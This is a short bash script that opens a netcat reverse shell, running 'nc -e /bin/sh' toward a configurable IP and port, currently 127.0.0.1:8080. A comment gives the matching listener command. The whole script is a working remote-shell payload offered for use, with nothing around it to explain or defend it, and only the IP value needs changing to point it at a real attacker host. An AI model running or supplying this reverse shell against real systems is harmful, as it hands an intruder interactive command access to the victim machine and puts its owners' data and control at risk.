#!/bin/bash

# Netcat command to listen to specific port --> nc -vv -l -p [PORT]
local_ip=127.0.0.1
port=8080
echo 'Initiating reverse shell connection using netcat..'
nc -e /bin/sh $local_ip $port
